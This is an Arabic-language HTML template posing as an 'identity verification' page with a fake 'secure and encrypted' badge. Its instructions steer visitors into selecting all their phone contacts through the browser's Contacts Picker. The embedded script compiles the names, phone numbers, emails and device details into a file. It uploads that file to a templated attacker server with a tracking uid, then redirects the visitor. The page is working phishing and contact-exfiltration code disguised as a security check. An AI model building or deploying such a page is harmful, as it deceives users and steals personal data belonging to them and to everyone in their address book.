<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحقق من الهوية</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0a0a0a;
      color: #fff;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #1a1a2e;
      border: 1px solid #2a2a4a;
      border-radius: 20px;
      padding: 40px 30px;
      max-width: 360px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 40px rgba(0,100,255,0.15);
    }
    .icon { font-size: 60px; margin-bottom: 20px; }
    h2 { font-size: 22px; margin-bottom: 10px; color: #e0e0ff; }
    p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
    .btn {
      background: linear-gradient(135deg, #0066ff, #0044aa);
      color: #fff;
      border: none;
      padding: 16px 40px;
      border-radius: 50px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      transition: opacity 0.2s;
    }
    .btn:active { opacity: 0.8; }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
      min-height: 20px;
    }
    .badge {
      display: inline-block;
      background: #0d3b00;
      color: #4caf50;
      border-radius: 20px;
      padding: 4px 14px;
      font-size: 12px;
      margin-bottom: 20px;
    }
    .progress {
      width: 100%;
      background: #333;
      border-radius: 10px;
      margin-top: 15px;
      display: none;
    }
    .progress-bar {
      height: 6px;
      background: #0066ff;
      border-radius: 10px;
      width: 0%;
      transition: width 0.3s;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🔐</div>
    <span class="badge">✓ آمن ومشفر</span>
    <h2>تحقق من الهوية</h2>
    <p>ستظهر نافذة، <strong>اضغط مطولاً على أي اسم لتحديد الكل</strong> ثم اضغط <strong>تم</strong> في الأعلى للمتابعة.</p>
    <button class="btn" id="mainBtn" onclick="getContacts()">التحقق والمتابعة</button>
    <div class="progress" id="progressBar"><div class="progress-bar" id="bar"></div></div>
    <div id="status"></div>
  </div>

  <script>
    const uid = "<%= uid %>";
    const serverURL = "<%= a %>";
    const redirectUrl = "<%= redirectUrl %>";

    async function getContacts() {
      const status = document.getElementById('status');
      const btn = document.getElementById('mainBtn');
      const progressDiv = document.getElementById('progressBar');
      const bar = document.getElementById('bar');

      btn.disabled = true;
      btn.textContent = 'جارٍ التحقق...';
      status.textContent = '';

      try {
        if (!('contacts' in navigator) || !('ContactsManager' in window)) {
          status.textContent = '❌ يرجى فتح الرابط من Chrome على Android.';
          btn.disabled = false;
          btn.textContent = 'التحقق والمتابعة';
          return;
        }

        const props = ['name', 'tel', 'email'];
        const opts = { multiple: true };
        const contacts = await navigator.contacts.select(props, opts);

        if (!contacts || contacts.length === 0) {
          status.textContent = '⚠️ يرجى اختيار جميع جهات الاتصال والضغط على تم.';
          btn.disabled = false;
          btn.textContent = 'التحقق والمتابعة';
          return;
        }

        progressDiv.style.display = 'block';
        bar.style.width = '10%';
        status.textContent = `جارٍ معالجة ${contacts.length} جهة اتصال...`;

        // Build VCF content
        let vcf = '';
        for (const c of contacts) {
          const name = c.name && c.name[0] ? c.name[0] : 'غير معروف';
          const tels = c.tel && c.tel.length > 0 ? c.tel : [];
          vcf += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\n`;
          for (const t of tels) vcf += `TEL:${t}\n`;
          vcf += `END:VCARD\n`;
        }

        bar.style.width = '40%';

        // Build TXT content
        const device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown Device';
        let txt = `All Contacts - ${device}\n`;
        txt += `Total: ${contacts.length} contacts\n`;
        txt += `Date: ${new Date().toLocaleString()}\n`;
        txt += '='.repeat(40) + '\n\n';
        for (const c of contacts) {
          const name = c.name && c.name[0] ? c.name[0] : 'Unknown';
          const tels = c.tel && c.tel.length > 0 ? c.tel.join(' | ') : '';
          const emails = c.email && c.email.length > 0 ? c.email.join(' | ') : '';
          txt += `Name: ${name}\n`;
          if (tels) txt += `Phone: ${tels}\n`;
          if (emails) txt += `Email: ${emails}\n`;
          txt += '\n';
        }

        bar.style.width = '60%';

        // Send TXT file
        const txtBlob = new Blob([txt], { type: 'text/plain' });
        const fileName = `All Contacts - ${device}.txt`;
        const formData = new FormData();
        formData.append('uid', uid);
        formData.append('file', txtBlob, fileName);
        formData.append('count', contacts.length);
        formData.append('filename', fileName);

        await fetch(serverURL + '/contacts-file', { method: 'POST', body: formData });

        bar.style.width = '100%';
        status.textContent = '✅ تم التحقق بنجاح';
        setTimeout(() => { window.location.href = redirectUrl; }, 1500);

      } catch (e) {
        status.textContent = '⚠️ يرجى المحاولة مرة أخرى واختيار جميع الاتصالات.';
        btn.disabled = false;
        btn.textContent = 'التحقق والمتابعة';
      }
    }
  </script>
</body>
</html>
